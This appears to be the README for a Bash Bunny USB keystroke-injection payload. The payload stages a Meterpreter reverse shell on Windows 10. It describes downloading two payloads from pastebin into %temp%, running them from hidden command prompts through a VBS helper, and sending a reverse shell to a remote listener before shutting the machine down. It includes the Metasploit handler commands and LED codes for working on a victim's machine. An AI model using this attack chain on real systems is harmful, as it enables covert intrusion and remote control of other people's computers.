JavaScript Meterpreter Stager Win x86_64

Author: subinacls
Version: Version 0.1
Target: Windows 10 x64

Description
  Tested successful on Win10
  Modified from original posted code:
    https://github.com/Cn33liz/JSMeter/blob/master/JSMeter.js
  USB HID Attck that attempts HTTP download of two (2) additional payloads.
  These files coinsist of:
    BB-Meterpreter-Winx64.js -> Actual bytecode of Windows/x64/meterpreter/reverse_tcp
    inv.vbs -> creates hidden command terminal to execute commands
  Attempts to execute the malicious payload in an automated fashion from hidden cmd prompts

Script Logic

  if inet connection:
    Attempts HTTPS connection to pastebin
      Grabs both payloads and saves to %temp%
  else:
    Opens a cmd prompt, under current users context
      Echo contents to two files:
        BB-Meterpreter_winx64.js
        inv.vbs
  Executes hidden cmdshell via inv.vbs, launching payload
  Sends Reverse shell to remote listener
  shutdown 0

Configuration

  Listener:
    use exploit/multi/handler
    # use for x64
    set PAYLOAD windows/x64/meterpreter/reverse_tcp
    # use for x86
    set PAYLOAD windows/meterpreter/reverse_tcp
    set LHOST 0.0.0.0
    set LPORT 443
    set EnableUnicodeEncoding true
    set EnableStageEncoding true
    set ExitOnSession false
    exploit -j
  BashBunny:
    Have single file payload on your BB

STATUS

LED	  =>  Status/PHASE
Green	=>  Power/EXECUTING
Red	  =>  Stage1/EXECUTING
Blue  =>  Stage2/SHUTDOWN
OFF   =>  Remove Device from victim
